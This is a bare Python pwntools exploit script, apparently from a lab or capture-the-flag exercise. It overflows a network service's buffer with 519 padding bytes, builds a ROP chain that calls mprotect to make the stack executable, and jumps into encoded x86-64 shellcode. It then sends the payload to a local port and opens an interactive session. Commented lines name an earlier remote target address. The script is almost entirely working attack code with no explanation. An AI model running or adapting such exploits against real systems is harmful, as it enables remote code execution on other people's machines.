from pwn import *
from struct import *
import requests

# sh=remote("10.10.46.135",9999)
# sh=remote("localhost",6690	)
# # libc = ELF('libc.so.6')

# # all_char=bytearray(range(1,256))	

p = remote("localhost",1337)

libc_address = 0x007ffff7c6f000
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x0a\xdb\xbf"
shellcode += b"\x49\xcf\x7b\xde\xd2\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x42\xea\x40\x23\xc6"
shellcode += b"\x23\x47\x64\x1a\x93\x36\x9f\x82\x4a\x17\xb8"
shellcode += b"\x28\x9a\xe5\xfb\xc8\x74\xdb\x9a\x8f\x1b\xc7"
shellcode += b"\x18\xa5\x71\x9f\x8b\x5a\xb1\x96\x11\x56\x11"
shellcode += b"\xdc\x8d\x60\xda\xe1\x46\xca\x33\x5b\x12\x72"
shellcode += b"\xe0\xf7\xde\x87\xc2\xdc\xd2\xde\xea\xb5\x43"
shellcode += b"\xc1\x6d\x8f\x9a\x83\x3d\xd5\x59\x95\x11\xf4"
shellcode += b"\x8a\x05\xde\xe6\x01\x4a\xbb\xa7\xf7\x43\x24"
shellcode += b"\x76\x3d\xd7\x2c\xb4\xf1\x52\xb1\xbf\x23\xca"
shellcode += b"\x33\x57\x35\x42\xea\x49\x46\xca\x22\x87\x8d"
shellcode += b"\x42\x5e\x7f\x30\x08\x11\xe2\x8a\x60\xda\xe0"
shellcode += b"\x46\xca\x25\xb4\xf4\x50\xd4\xba\x01\x4a\xbb"
shellcode += b"\xa6\x3f\xf5\x3d\xbf\x49\xcf\x7b\xde\xd2"

padding=b"\x90"*140

payload = b""
payload += b"A" * 519
payload += p64(libc_address+0x0000000000027c3d) # pop rdi ; ret
payload += p64(0x007ffffffde000) # stack address
payload += p64(libc_address+0x000000000002940f) # pop rsi ; pop r15 ; ret
payload += p64(0x21000) # size
# payload += p64(0xAAAAAAAAAAAAAAAA) # garbage for r15
payload += p64(libc_address+0x00000000000caa2d) # pop rdx ; ret from libc
payload += p64(0x7) #mode
payload += p64(0x7ffff7d671e0) # mprotect address
# payload += p64(0x7ffff7d671ef) # ret
payload += p64(libc_address+0x00000000000465f8) # shellcode address jmp rsp
# payload += padding
payload += shellcode # shellcode

with open("payload.txt", "wb") as binary_file:
    binary_file.write(payload)

p.sendline(p32(len(payload),endian='big'))

p.sendline(payload)
p.interactive()